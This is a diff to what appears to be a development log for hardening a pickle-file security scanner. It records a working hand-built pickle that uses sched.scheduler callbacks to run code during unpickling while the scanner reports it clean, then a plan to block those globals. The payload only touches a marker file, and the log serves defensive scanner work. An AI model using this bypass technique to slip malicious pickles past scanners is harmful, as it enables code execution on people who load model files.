@@ -1377,3 +1377,103 @@ Blocking plan:
 Performance note: the fix adds one tuple to a sorted static table checked with
 binary search. It does not add lifetime simulation, weakref-specific stack
 analysis, or broader callback-flow tracking.
+
+## Turn 35 - `sched.scheduler` queued-callback dispatch gap
+
+Goal: produce another immediate RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    return b"\x8c" + bytes([len(data)]) + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_sched_scheduler_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("sched", "scheduler"),
+        b")R\x94",
+        sg("sched", "scheduler.enter"),
+        b"(",
+        b"h\x00",
+        b"K\x00",
+        b"K\x00",
+        sg("pathlib", "Path.touch"),
+        sg("pathlib", "PosixPath"),
+        b"(",
+        s("/"),
+        s("tmp"),
+        s("ma_sched_scheduler_marker"),
+        b"tR",
+        b"\x85",
+        b"tR0",
+        sg("sched", "scheduler.run"),
+        b"h\x00",
+        b"\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`
+- Scanner import references:
+  `sched.scheduler`, `sched.scheduler.enter`, `pathlib.Path.touch`,
+  `pathlib.PosixPath`, and `sched.scheduler.run`, all with
+  `is_dangerous=False`
+- Unpickle result: creates `/tmp/ma_sched_scheduler_marker` before
+  `pickle.loads()` returns and returns `None`
+- RCE mechanism: the pickle constructs a `sched.scheduler()` object, memoizes
+  it, calls `scheduler.enter(0, 0, pathlib.Path.touch, (marker,))` to queue an
+  attacker-selected callback with attacker-controlled arguments, discards the
+  returned event, then calls `scheduler.run()` on the same memoized scheduler.
+  A zero-delay event is due immediately, so `run()` dispatches the callback
+  during unpickling.
+
+Why the scanner missed it:
+
+- `sched` is absent from both `DANGEROUS_WILDCARD_MODULES` and
+  `DANGEROUS_GLOBALS`.
+- The payload uses only currently clean globals: `sched.scheduler`,
+  `sched.scheduler.enter`, `sched.scheduler.run`, `pathlib.Path.touch`, and
+  `pathlib.PosixPath`.
+- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
+  `os.system`, or `subprocess`.
+
+Performance note: this is a scheduler callback dispatch sink, not an opcode
+parser miss. The focused next block should add sorted `DANGEROUS_GLOBALS`
+entries for `("sched", "scheduler.enter")`, `("sched", "scheduler.enterabs")`,
+and `("sched", "scheduler.run")`, plus a manual-pickle oracle regression for
+the memoized scheduler proof. The hot path remains static policy lookup.
+
+## Turn 36 - Block `sched.scheduler` queued callbacks
+
+Blocking plan:
+
+- Add `("sched", "scheduler.enter")`, `("sched", "scheduler.enterabs")`, and
+  `("sched", "scheduler.run")` to the sorted Rust `DANGEROUS_GLOBALS` table.
+  `sched.scheduler` itself stays allowed because it only creates the scheduler;
+  `enter`/`enterabs` wire attacker-selected callbacks and `run` dispatches
+  queued callbacks.
+- Add portable policy coverage for all three raw global reductions so
+  detection does not depend on callback timing.
+- Add a CPython oracle regression that manually builds the memoized scheduler
+  payload, verifies scanner detection for `scheduler.enter` and
+  `scheduler.run`, then proves the queued callback creates the marker during
+  `pickle.loads()`.
+
+Performance note: the fix adds three tuples to a sorted static table checked
+with binary search. It does not add scheduler state modeling, event queue
+simulation, or broader callback-flow tracking.
